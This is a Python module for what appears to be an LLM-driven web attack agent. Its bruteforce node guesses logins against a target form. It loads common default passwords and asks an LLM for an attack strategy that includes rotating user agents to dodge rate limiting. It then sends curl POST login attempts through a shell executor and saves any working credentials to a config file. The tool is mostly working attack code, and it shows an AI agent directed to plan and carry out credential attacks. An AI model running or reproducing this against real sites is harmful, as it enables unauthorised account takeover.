"""
Bruteforce Agent - Attempts to discover valid credentials through intelligent bruteforcing
Uses common credentials, pattern analysis, and cryptographic algorithm detection
"""
from langchain_core.messages import SystemMessage, HumanMessage
from states.agent_state import AgentState
from utils.ansi import MAGENTA, GREEN, RED, YELLOW, CYAN, RESET, BOLD
from utils.reasoning import ReasoningDisplay
from tools.executor import execute
import json
import itertools
from urllib.parse import urlparse


def bruteforce_node(state: AgentState, orch=None):
    """
    Bruteforce agent that:
    1. Receives target from login_injector when credentials unavailable
    2. Loads common credentials from configs/credentials.json
    3. Attempts authentication with common username/password combinations
    4. Analyzes user ID patterns for cryptographic algorithms
    5. Returns successful credentials to save in configs
    """
    
    print(f"{MAGENTA}[>][bruteforce]{RESET} Initiating credential discovery...", flush=True)
    
    # Get bruteforce target details
    bruteforce_target = state.get('bruteforce_target', {})
    target_url = bruteforce_target.get('url', state.get('current_test_url', ''))
    form_action = bruteforce_target.get('form_action', target_url)
    field_names = bruteforce_target.get('field_names', [])
    
    print(f"{CYAN}[*][bruteforce]{RESET} Target: {target_url}", flush=True)
    print(f"{CYAN}[*][bruteforce]{RESET} Form action: {form_action}", flush=True)
    
    # Load common credentials from configs
    try:
        with open('configs/credentials.json', 'r') as f:
            creds_data = json.load(f)
        
        common_usernames = creds_data.get('default', {}).get('common_usernames', ['admin'])
        common_passwords = creds_data.get('default', {}).get('common_passwords', ['admin'])
    except Exception as e:
        print(f"{YELLOW}[!][bruteforce]{RESET} Using built-in defaults: {e}", flush=True)
        common_usernames = ['admin', 'administrator', 'root', 'user']
        common_passwords = ['admin', 'password', '123456', 'admin123']
    
    # Identify form field names
    username_field = 'username'
    password_field = 'password'
    
    for field in field_names:
        field_lower = field.lower()
        if 'user' in field_lower or 'email' in field_lower or 'login' in field_lower:
            username_field = field
        if 'pass' in field_lower or 'pwd' in field_lower:
            password_field = field
    
    print(f"{CYAN}[*][bruteforce]{RESET} Detected fields: {username_field}, {password_field}", flush=True)
    print(f"{CYAN}[*][bruteforce]{RESET} Testing {len(common_usernames)} usernames × {len(common_passwords)} passwords...", flush=True)
    
    successful_creds = None
    attempts = 0
    max_attempts = 20  # Limit to prevent excessive requests
    
    # Build LLM-assisted bruteforce prompt
    prompt = f"""You are a Credential Discovery Specialist performing authorized authentication testing.

TARGET INFORMATION:
- URL: {target_url}
- Form Action: {form_action}
- Username Field: {username_field}
- Password Field: {password_field}
- Common Usernames: {common_usernames[:5]}
- Common Passwords: {common_passwords[:5]}

YOUR TASK:
1. Generate an intelligent bruteforce strategy
2. Prioritize likely username/password combinations
3. Suggest pattern analysis for user IDs (incremental, hash-based, UUID)
4. Identify potential cryptographic algorithms used for user IDs
5. Recommend the most efficient attack approach

BRUTEFORCE STRATEGIES:

1. **Common Credentials** (Priority 1)
   - Try admin/admin, admin/password, root/root
   - Default vendor credentials
   - Weak passwords: 123456, password, admin123

2. **Pattern Analysis** (Priority 2)
   - If user IDs are visible: user1, user2, user3 → try incrementing
   - If hashed IDs: md5, sha1, sha256 → identify pattern
   - If UUIDs: look for predictable generation

3. **Smart Combinations** (Priority 3)
   - Username = Password (admin/admin)
   - Password = Username123 (admin/admin123)
   - Common variants (Admin/Admin, ADMIN/ADMIN)

4. **Rate Limiting Detection**
   - Check response times for rate limiting
   - Implement delays if detected
   - Use rotating user agents

OUTPUT FORMAT (JSON):
{{
  "recommended_strategy": "common_creds|pattern_analysis|smart_combinations",
  "priority_combinations": [
    {{"username": "admin", "password": "admin", "priority": 1}},
    {{"username": "admin", "password": "password", "priority": 2}}
  ],
  "user_id_pattern": "incremental|hash|uuid|custom",
  "cryptographic_algorithm": "none|md5|sha1|sha256|bcrypt",
  "rate_limiting_strategy": "no_delay|1s_delay|5s_delay|exponential_backoff",
  "max_attempts_recommended": 10
}}

Provide an intelligent bruteforce strategy for this target.
"""
    
    messages = [
        SystemMessage(content=prompt),
        HumanMessage(content="Generate bruteforce strategy. Return ONLY JSON.")
    ]
    
    display = ReasoningDisplay("bruteforce", MAGENTA)
    
    try:
        print(f"\n[>] Executing tools...", flush=True)
        print(f"  1. bruteforce", flush=True)
        print(f"     • Generating attack strategy", flush=True)
        print(f"     [~] Running...", flush=True)
        
        response = orch.model.invoke(messages) if orch else None
        
        print(f"     ✓ Tools completed\n", flush=True)
        
        if response:
            content = response.content
            
            # Parse strategy
            try:
                if '{' in content and '}' in content:
                    json_start = content.find('{')
                    json_end = content.rfind('}') + 1
                    json_str = content[json_start:json_end]
                    strategy = json.loads(json_str)
                else:
                    strategy = {}
            except:
                strategy = {}
            
            priority_combos = strategy.get('priority_combinations', [])
            
            # If no LLM strategy, use defaults
            if not priority_combos:
                priority_combos = [
                    {'username': u, 'password': p, 'priority': i+1}
                    for i, (u, p) in enumerate(itertools.product(common_usernames[:3], common_passwords[:3]))
                ][:max_attempts]
    except Exception as e:
        print(f"{YELLOW}[!][bruteforce]{RESET} Strategy generation failed: {e}", flush=True)
        # Fallback to simple combinations
        priority_combos = [
            {'username': u, 'password': p, 'priority': i+1}
            for i, (u, p) in enumerate(itertools.product(common_usernames[:3], common_passwords[:3]))
        ][:max_attempts]
    
    # Execute bruteforce attempts
    print(f"{CYAN}[*][bruteforce]{RESET} Attempting credential discovery...", flush=True)
    
    for combo in priority_combos[:max_attempts]:
        username = combo.get('username')
        password = combo.get('password')
        attempts += 1
        
        print(f"{CYAN}[{attempts}/{max_attempts}]{RESET} Trying: {username}:{password}", flush=True)
        
        # Build POST request
        login_cmd = f'curl -s -L -X POST -d "{username_field}={username}&{password_field}={password}" "{form_action}"'
        
        try:
            result = execute.invoke({'cmd': login_cmd, 'timeout_sec': 10})
            
            # Check for success indicators
            success_indicators = ['welcome', 'dashboard', 'logout', 'profile', 'success']
            failure_indicators = ['invalid', 'incorrect', 'failed', 'error', 'denied']
            
            result_lower = result.lower()
            
            has_success = any(ind in result_lower for ind in success_indicators)
            has_failure = any(ind in result_lower for ind in failure_indicators)
            
            if has_success and not has_failure:
                print(f"{GREEN}[+][bruteforce]{RESET} {BOLD}SUCCESS!{RESET} Valid credentials found: {username}:{password}", flush=True)
                successful_creds = {
                    'id': username,
                    'password': password,
                    'cookie': '',
                    'session': '',
                    'discovered_by': 'bruteforce',
                    'attempts': attempts
                }
                break
            
        except Exception as e:
            print(f"{YELLOW}[!][bruteforce]{RESET} Attempt failed: {e}", flush=True)
            continue
    
    if successful_creds:
        # Save credentials
        try:
            with open('configs/credentials.json', 'r') as f:
                creds_data = json.load(f)
            
            domain = urlparse(target_url).netloc
            successful_creds['site'] = domain
            successful_creds['status'] = 'active'
            
            # Update credentials file
            found = False
            for i, cred in enumerate(creds_data.get('credentials', [])):
                if domain in cred.get('site', ''):
                    creds_data['credentials'][i] = successful_creds
                    found = True
                    break
            
            if not found:
                creds_data['credentials'].append(successful_creds)
            
            with open('configs/credentials.json', 'w') as f:
                json.dump(creds_data, f, indent=2)
            
            print(f"{GREEN}[+][bruteforce]{RESET} Credentials saved to configs/credentials.json", flush=True)
        except Exception as e:
            print(f"{YELLOW}[!][bruteforce]{RESET} Could not save credentials: {e}", flush=True)
        
        return {
            'bruteforce': f'Credentials discovered: {successful_creds["id"]}',
            'bruteforce_success': True,
            'credentials_found': successful_creds,
            'routing_decision': 'login_injector',  # Go back to login_injector with new creds
            'attempts': attempts
        }
    else:
        print(f"{RED}[-][bruteforce]{RESET} Failed to discover valid credentials after {attempts} attempts", flush=True)
        print(f"{YELLOW}[!][bruteforce]{RESET} Consider manual credential entry or advanced techniques", flush=True)
        
        return {
            'bruteforce': f'Credential discovery failed after {attempts} attempts',
            'bruteforce_success': False,
            'routing_decision': 'skip_authentication',  # Continue without auth
            'attempts': attempts
        }
